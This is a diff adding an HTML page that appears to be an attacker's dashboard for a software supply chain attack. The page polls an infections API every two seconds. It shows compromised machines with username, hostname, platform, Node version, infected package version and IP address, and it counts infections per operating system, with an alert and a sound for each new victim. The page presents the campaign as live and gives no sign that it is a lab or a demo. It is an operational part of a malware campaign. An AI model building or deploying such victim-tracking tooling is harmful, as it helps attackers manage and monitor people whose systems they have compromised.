@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Supply Chain Attack Dashboard</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a0000 100%);
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            padding: 20px;
+            min-height: 100vh;
+        }
+        .container { max-width: 1400px; margin: 0 auto; }
+        .header {
+            text-align: center;
+            padding: 30px;
+            border: 2px solid #ff0000;
+            background: rgba(255, 0, 0, 0.1);
+            margin-bottom: 30px;
+            border-radius: 10px;
+        }
+        .header h1 {
+            font-size: 3em;
+            margin-bottom: 10px;
+            color: #ff0000;
+        }
+        .header p { font-size: 1.2em; color: #00ff00; }
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        .stat-card {
+            background: rgba(0, 255, 0, 0.05);
+            border: 2px solid #00ff00;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+        }
+        .stat-card h3 { font-size: 1em; margin-bottom: 10px; color: #00ff00; }
+        .stat-card .number { font-size: 3em; font-weight: bold; color: #ff0000; }
+        .infections-container {
+            background: rgba(0, 0, 0, 0.5);
+            border: 2px solid #00ff00;
+            border-radius: 10px;
+            padding: 20px;
+            max-height: 600px;
+            overflow-y: auto;
+        }
+        .infections-container h2 {
+            margin-bottom: 20px;
+            color: #ff0000;
+            font-size: 2em;
+            text-align: center;
+        }
+        .infection-item {
+            background: rgba(255, 0, 0, 0.1);
+            border-left: 4px solid #ff0000;
+            padding: 15px;
+            margin-bottom: 15px;
+            border-radius: 5px;
+        }
+        .infection-item.new {
+            border-left-color: #ffff00;
+            background: rgba(255, 255, 0, 0.15);
+            animation: slideIn 0.5s ease-out;
+        }
+        @keyframes slideIn {
+            from { 
+                transform: translateX(-100%); 
+                opacity: 0; 
+            }
+            to { 
+                transform: translateX(0); 
+                opacity: 1; 
+            }
+        }
+        .infection-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            font-weight: bold;
+            color: #ff0000;
+        }
+        .infection-details {
+            font-size: 0.9em;
+            color: #00ff00;
+            line-height: 1.6;
+        }
+        .infection-details span { display: inline-block; margin-right: 20px; }
+        .no-infections {
+            text-align: center;
+            padding: 40px;
+            color: #666;
+            font-size: 1.2em;
+        }
+        .controls { text-align: center; margin-bottom: 20px; }
+        .btn {
+            background: #ff0000;
+            color: #000;
+            border: none;
+            padding: 10px 30px;
+            font-size: 1em;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 5px;
+            margin: 0 10px;
+        }
+        .btn:hover { background: #ff3333; }
+        .alert {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #ff0000;
+            color: #000;
+            padding: 20px;
+            border-radius: 10px;
+            font-weight: bold;
+            font-size: 1.2em;
+            z-index: 1000;
+        }
+        
+        /* Scrollbar styling */
+        .infections-container::-webkit-scrollbar {
+            width: 8px;
+        }
+        .infections-container::-webkit-scrollbar-track {
+            background: rgba(0, 255, 0, 0.1);
+            border-radius: 4px;
+        }
+        .infections-container::-webkit-scrollbar-thumb {
+            background: #00ff00;
+            border-radius: 4px;
+        }
+        .infections-container::-webkit-scrollbar-thumb:hover {
+            background: #00cc00;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>COMPROMISED SYSTEMS</h1>
+            <p>Supply Chain Attack - Real-Time Monitoring</p>
+        </div>
+        <div class="stats">
+            <div class="stat-card">
+                <h3>TOTAL INFECTIONS</h3>
+                <div class="number" id="totalInfections">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>WINDOWS</h3>
+                <div class="number" id="windowsCount">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>MAC</h3>
+                <div class="number" id="macCount">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>LINUX</h3>
+                <div class="number" id="linuxCount">0</div>
+            </div>
+        </div>
+        <div class="controls">
+            <button class="btn" onclick="resetInfections()">RESET DATA</button>
+            <button class="btn" onclick="refreshData()">REFRESH</button>
+        </div>
+        <div class="infections-container">
+            <h2>LIVE INFECTION LOG</h2>
+            <div id="infectionsList">
+                <div class="no-infections">Waiting for infections...</div>
+            </div>
+        </div>
+    </div>
+    <script>
+        let lastInfectionCount = 0;
+        let alertTimeout;
+        let knownInfectionIds = new Set();
+
+        async function fetchInfections() {
+            try {
+                const response = await fetch('/api/infections');
+                const infections = await response.json();
+                
+                const newInfections = infections.filter(inf => !knownInfectionIds.has(inf.id));
+                
+                if (newInfections.length > 0) {
+                    showAlert('NEW INFECTION DETECTED!');
+                    playSound();
+                }
+                
+                displayInfections(infections, newInfections.map(i => i.id));
+                updateStats(infections);
+            } catch (error) {
+                console.error('Error fetching infections:', error);
+            }
+        }
+
+        function displayInfections(infections, newIds) {
+            const list = document.getElementById('infectionsList');
+            if (infections.length === 0) {
+                list.innerHTML = '<div class="no-infections">Waiting for infections...</div>';
+                knownInfectionIds.clear();
+                return;
+            }
+            
+            const html = infections.slice().reverse().map((inf) => {
+                const isNew = newIds.includes(inf.id);
+                const date = new Date(inf.timestamp);
+                return `
+                    <div class="infection-item ${isNew ? 'new' : ''}" data-id="${inf.id}">
+                        <div class="infection-header">
+                            <span>${inf.username}@${inf.hostname}</span>
+                            <span>${date.toLocaleTimeString()}</span>
+                        </div>
+                        <div class="infection-details">
+                            <span>Platform: ${inf.platform}</span>
+                            <span>Node: ${inf.nodeVersion}</span>
+                            <span>Package: v${inf.packageVersion}</span>
+                            <span>IP: ${inf.ip}</span>
+                        </div>
+                    </div>
+                `;
+            }).join('');
+            list.innerHTML = html;
+            
+            infections.forEach(inf => knownInfectionIds.add(inf.id));
+            
+            setTimeout(() => {
+                document.querySelectorAll('.infection-item.new').forEach(item => {
+                    item.classList.remove('new');
+                });
+            }, 500);
+        }
+
+        function updateStats(infections) {
+            document.getElementById('totalInfections').textContent = infections.length;
+            const platforms = { win32: 0, darwin: 0, linux: 0 };
+            infections.forEach(inf => {
+                if (platforms.hasOwnProperty(inf.platform)) {
+                    platforms[inf.platform]++;
+                }
+            });
+            document.getElementById('windowsCount').textContent = platforms.win32;
+            document.getElementById('macCount').textContent = platforms.darwin;
+            document.getElementById('linuxCount').textContent = platforms.linux;
+        }
+
+        function showAlert(message) {
+            const existing = document.querySelector('.alert');
+            if (existing) existing.remove();
+            const alert = document.createElement('div');
+            alert.className = 'alert';
+            alert.textContent = message;
+            document.body.appendChild(alert);
+            clearTimeout(alertTimeout);
+            alertTimeout = setTimeout(() => alert.remove(), 3000);
+        }
+
+        function playSound() {
+            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            const oscillator = audioContext.createOscillator();
+            const gainNode = audioContext.createGain();
+            oscillator.connect(gainNode);
+            gainNode.connect(audioContext.destination);
+            oscillator.frequency.value = 800;
+            oscillator.type = 'sine';
+            gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
+            gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);
+            oscillator.start(audioContext.currentTime);
+            oscillator.stop(audioContext.currentTime + 0.5);
+        }
+
+        async function resetInfections() {
+            if (confirm('Are you sure you want to reset all infection data?')) {
+                try {
+                    await fetch('/api/reset', { method: 'POST' });
+                    knownInfectionIds.clear();
+                    fetchInfections();
+                } catch (error) {
+                    console.error('Error resetting infections:', error);
+                }
+            }
+        }
+
+        function refreshData() { fetchInfections(); }
+        setInterval(fetchInfections, 2000);
+        fetchInfections();
+    </script>
+</body>
+</html>
